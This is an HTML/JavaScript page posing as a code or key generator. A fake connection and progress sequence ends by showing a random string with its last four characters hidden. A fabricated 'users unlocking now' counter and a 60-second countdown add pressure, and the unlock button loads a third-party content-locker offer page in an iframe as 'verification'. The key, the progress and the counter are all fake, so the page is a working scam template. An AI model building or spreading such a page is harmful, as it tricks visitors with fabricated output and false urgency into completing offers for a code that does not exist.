<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Generator</title>

<style>
body{
    background:#0b0b0f;
    margin:0;
    padding:25px;
    font-family:Arial;
    display:flex;
    justify-content:center;
}

.box{
    width:92%;
    max-width:380px;
    background:#fff;
    padding:35px 25px;
    border-radius:22px;
    text-align:center;
    box-shadow:0 0 30px rgba(0,0,0,0.3);
}

h2{
    margin:0;
    font-size:26px;
    color:#222;
    font-weight:700;
}

.progressBar{
    width:100%;
    height:10px;
    background:#e3e3e3;
    border-radius:20px;
    margin:25px 0;
}

.progressFill{
    width:0%;
    height:100%;
    background:#f5c400;
    border-radius:20px;
    transition:width 1.5s linear;
}

.text{
    font-size:16px;
    color:#777;
    line-height:1.4;
    min-height:55px;
}

.green{
    color:#3bb30b;
    font-weight:bold;
}

#key{
    font-size:20px;
    font-weight:bold;
    letter-spacing:2px;
    margin-top:15px;
    display:none;
}

#unlockBtn{
    display:none;
    margin-top:18px;
    padding:12px 18px;
    background:#e60000;
    color:#fff;
    border:none;
    font-size:16px;
    font-weight:bold;
    border-radius:10px;
    cursor:pointer;
    width:100%;
}

#retryBtn{
    display:none;
    margin-top:10px;
    padding:10px 14px;
    background:#333;
    color:#fff;
    border:none;
    border-radius:10px;
    cursor:pointer;
    width:100%;
}

#retryBtn.small{
    width:auto;
    padding:6px 10px;
    font-size:14px;
}

#notice{
    display:none;
    font-size:14px;
    color:#b10000;
    margin-top:10px;
}

#liveBox{
    display:none;
    margin-top:12px;
    font-size:14px;
    color:#444;
}

#timer{
    font-weight:bold;
    color:#e60000;
}

#iframeWrap{
    margin-top:15px;
    display:none;
}

iframe{
    width:100%;
    height:520px;
    border:0;
    border-radius:18px;
}
</style>
</head>
<body>

<div class="box">

    <h2 id="title">CONNECTING</h2>

    <div class="progressBar">
        <div class="progressFill" id="fill"></div>
    </div>

    <div class="text" id="text">Connecting to server...</div>

    <div id="key"></div>

    <button id="unlockBtn">UNLOCK LAST CODE</button>
    <button id="retryBtn" class="small">TRY AGAIN</button>

    <div id="notice">⚠ Complete a quick verification to reveal the last 4 digits.</div>

    <div id="liveBox">
        <span id="liveCount">12</span> users unlocking now • Time left: <span id="timer">60</span>s
    </div>

    <div id="iframeWrap">
        <iframe src="" id="lockerFrame" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
    </div>

</div>

<script>
const lockerURL = "https://hubverify.com/cl/?o=6925248a5a19d";
const fill = document.getElementById("fill");
const t = document.getElementById("title");
const txt = document.getElementById("text");
const keyBox = document.getElementById("key");
const frame = document.getElementById("lockerFrame");
const unlockBtn = document.getElementById("unlockBtn");
const retryBtn = document.getElementById("retryBtn");
const notice = document.getElementById("notice");
const liveBox = document.getElementById("liveBox");
const liveCount = document.getElementById("liveCount");
const timerBox = document.getElementById("timer");

let unlocked = false;   // user clicked unlock
let timer = null;       // countdown interval
let liveInterval = null;
let countdown = 60;     // seconds to allow unlock BEFORE expiring

// Generate a key (masked later)
function genKey(){
    const c="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let x="";
    for(let i=0;i<10;i++){
        x += c[Math.floor(Math.random()*c.length)];
    }
    return x;
}

// Initialize / start the generation flow
function startFlow(){
    // reset flags and UI
    unlocked = false;
    clearIntervals();
    fill.style.width = "0%";
    t.innerHTML = "CONNECTING";
    txt.innerHTML = "Connecting to server...";
    keyBox.style.display = "none";
    unlockBtn.style.display = "none";
    unlockBtn.disabled = false;
    retryBtn.style.display = "none";
    notice.style.display = "none";
    liveBox.style.display = "none";
    document.getElementById("iframeWrap").style.display = "none";
    frame.src = "";

    // staged progress (same as before)
    setTimeout(()=>{ fill.style.width="50%"; t.innerHTML="CONNECTING"; txt.innerHTML="Connecting to server..."; },300);
    setTimeout(()=>{ fill.style.width="100%"; t.innerHTML="GENERATING"; txt.innerHTML=`Connecting to server...<br><span class='green'>Connected</span><br>Generating Key...`; },2300);
    setTimeout(()=>{ 
        t.innerHTML="COMPLETED";
        txt.innerHTML=`Connecting to server...<br><span class='green'>Connected</span><br>Generating Key...<br><span class='green'>Key Generated</span>`;
        const raw = genKey();
        // show masked key (hide last 4 digits)
        keyBox.style.display = "block";
        keyBox.innerHTML = raw.slice(0,6) + "****";
        unlockBtn.style.display = "block";
        notice.style.display = "block";
        liveBox.style.display = "block";
        // start countdown and live user anim
        startTimer();
        startLiveUsers();
    },4300);
}

// Timer: counts down; if reaches 0 and user didn't click unlock -> expire
function startTimer(){
    countdown = 60;
    timerBox.innerText = countdown;
    timer = setInterval(()=>{
        countdown--;
        timerBox.innerText = countdown;
        if(countdown <= 0){
            clearInterval(timer);
            onExpire();
        }
    },1000);
}

// Live user fake counter
function startLiveUsers(){
    liveInterval = setInterval(()=>{
        let current = parseInt(liveCount.innerHTML) || 12;
        let random = Math.random() < 0.5 ? -1 : +1;
        current += random;
        if(current < 7) current = 7;
        if(current > 22) current = 22;
        liveCount.innerHTML = current;
    },1500);
}

// Called when timer expires without unlock
function onExpire(){
    if(unlocked) return; // if already unlocked, ignore
    // hide key, disable unlock, show retry
    keyBox.style.display = "block";
    keyBox.innerHTML = "---- ---- ---- ----";
    t.innerHTML = "EXPIRED";
    txt.innerHTML = "<span style='color:#b10000;font-weight:700'>Offer expired.</span> Complete the offer to reveal the code. Try again.";
    unlockBtn.style.display = "none";
    unlockBtn.disabled = true;
    notice.style.display = "block";
    notice.innerHTML = "⏳ Time expired — the offer has expired. Tap TRY AGAIN to attempt once more.";
    retryBtn.style.display = "block";
    // stop live users
    clearIntervals();
}

// helper to clear intervals
function clearIntervals(){
    if(timer) { clearInterval(timer); timer = null; }
    if(liveInterval) { clearInterval(liveInterval); liveInterval = null; }
}

// User clicks unlock
unlockBtn.addEventListener("click", ()=>{
    // mark unlocked and open iframe
    unlocked = true;
    clearIntervals();
    document.getElementById("iframeWrap").style.display = "block";
    frame.src = lockerURL;
    unlockBtn.style.display = "none";
    notice.innerHTML = "✔ Verification started... complete it to reveal full code.";
    // update text
    t.innerHTML = "VERIFICATION";
    txt.innerHTML = "Please complete the quick verification in the window below.";
    // optional: reveal last 4 after a simulated delay? (we won't auto-reveal; depends on external)
});

// Retry button click -> restart flow
retryBtn.addEventListener("click", ()=>{
    startFlow();
});

// Start first flow on page load
startFlow();

</script>

</body>
</html>
